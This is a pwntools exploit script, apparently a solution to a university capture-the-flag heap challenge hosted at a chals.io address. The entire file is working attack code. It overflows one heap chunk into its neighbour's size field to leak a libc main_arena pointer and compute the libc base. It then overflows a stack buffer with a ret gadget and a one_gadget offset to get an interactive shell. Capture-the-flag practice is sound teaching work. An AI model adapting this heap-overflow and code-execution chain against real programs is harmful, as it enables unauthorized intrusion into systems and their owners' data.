from pwn import *

binary = "./chal.bin_patched"

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

libc = ELF("libc.so.6")

gs = '''
break execve
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path)
    if args.REMOTE:
        return remote("cse4850-allocate-1.chals.io", 443, ssl=True, sni="cse4850-allocate-1.chals.io")
    return process(e.path)

p = start()

def create(index, content):
    log.info(f"Creating concert at index {index} with content {content}")
    p.sendlineafter(b">>>", b"1")
    p.sendlineafter(b">>>", str(index).encode('utf-8'))
    p.sendafter(b">>>", content)

def edit(index, content):
    log.info(f"Editing concert {index} to have content {content}")
    p.sendlineafter(b">>>", b"2")
    p.sendlineafter(b">>>", str(index).encode('utf-8'))
    p.sendafter(b">>>", content)

def delete(index):
    log.info(f"Deleting concert {index}")
    p.sendlineafter(b">>>", b"3")
    p.sendlineafter(b">>>", str(index).encode('utf-8'))

def view(index):
    p.sendlineafter(b">>>", b"4")
    p.sendlineafter(b">>>", str(index).encode('utf-8'))
    p.recvuntil(b"Details: ")
    #p.recvline()
    value = p.recvline()
    log.info(f"Viewed concert {index} to have value {value}")
    return value[:-1]

def jump(addr):
    r = ROP(libc)
    log.info(f"Jumping to {hex(addr)}")
    p.sendlineafter(b">>>", b"5")
    payload = b"A"*0x78
    payload += p64(r.find_gadget(['ret'])[0])
    payload += p64(addr)
    p.sendlineafter(b">>>", payload)

create(0, 0x87*b"A")
create(1, 0x87*b"B")
create(2, 0x87*b"C")
delete(1)
edit(0, 0x88*b"D" + b"\x93" + b"\0"*7)
create(1, 8*b"A")
leak = u64(view(1)[8:] + b'\0'*2)

log.info(f"Leak: {hex(leak)}")
libc.address = leak - libc.symbols["main_arena"] - 88
log.info(f"Libc main address: {hex(libc.address)}")

jump(libc.address + 0xf02a4)

p.interactive()